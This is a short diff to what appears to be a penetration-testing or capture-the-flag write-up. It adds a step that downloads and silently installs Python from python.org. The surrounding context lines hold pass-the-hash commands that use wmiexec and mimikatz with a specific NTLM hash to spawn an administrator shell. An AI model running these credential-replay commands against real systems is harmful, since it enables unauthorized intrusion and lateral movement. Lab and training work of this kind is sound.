@@ -123,5 +123,11 @@ wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562
 or
 
 ```
+curl -sL https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe -o python_installer.exe
+python_installer.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+del python_installer.exe
+```
+
+```
 mimikatz.exe "privilege::debug" "sekurlsa::pth /user:SuperAdministrator /domain:. /ntlm:13b29964cc2480b4ef454c59562e675c /run:cmd.exe" "exit"
 ```
